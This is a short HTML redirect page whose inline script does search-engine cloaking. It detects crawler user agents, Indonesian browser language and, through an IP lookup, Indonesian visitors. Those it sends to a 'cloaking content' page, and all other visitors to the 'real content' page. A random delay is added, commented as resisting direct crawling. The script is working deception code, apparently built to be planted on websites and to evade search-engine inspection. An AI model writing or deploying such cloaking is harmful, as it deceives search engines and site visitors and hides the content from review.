<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Redirecting...</title>
  <script>
    // =========================
    // CONFIGURABLE URL TARGETS
    // =========================
    const CLOAK_URL = 'gitnore.html'; // konten cloaking
    const REAL_URL = 'about.html';    // konten asli

    // =========================
    // BOT & INDONESIA DETECTION
    // =========================
    const ua = navigator.userAgent.toLowerCase();
    const lang = navigator.language.toLowerCase();

    const botAgents = [
      'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
      'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
      'google-inspectiontool', 'google-site-verification', 'googlebot-news'
    ];

    const isBot = botAgents.some(bot => ua.includes(bot));
    const isMobile = /android|iphone|ipad|mobile|opera mini|windows phone/.test(ua);
    const isIndo = lang.includes('id');

    // Optional: Get country using IP API (client-side IP lookup)
    async function getCountryCode() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return data.country;
      } catch (e) {
        return null;
      }
    }

    // =========================
    // REDIRECT LOGIC
    // =========================
    async function handleRedirect() {
      const country = await getCountryCode();

      // CLOAK jika bot, bahasa Indonesia, atau IP dari Indonesia
      if (isBot || isIndo || country === 'ID') {
        console.log('CLOAKED →', CLOAK_URL);
        window.location.href = CLOAK_URL;
      } else {
        console.log('REAL CONTENT →', REAL_URL);
        window.location.href = REAL_URL;
      }
    }

    // Natural delay agar mirip server (anti-crawl langsung)
    setTimeout(() => {
      handleRedirect();
    }, Math.floor(Math.random() * 300) + 200); // delay 200–500ms

  </script>
</head>
<body>
  <p style="text-align: center; margin-top: 50px;">Mohon tunggu sebentar...</p>
</body>
</html>
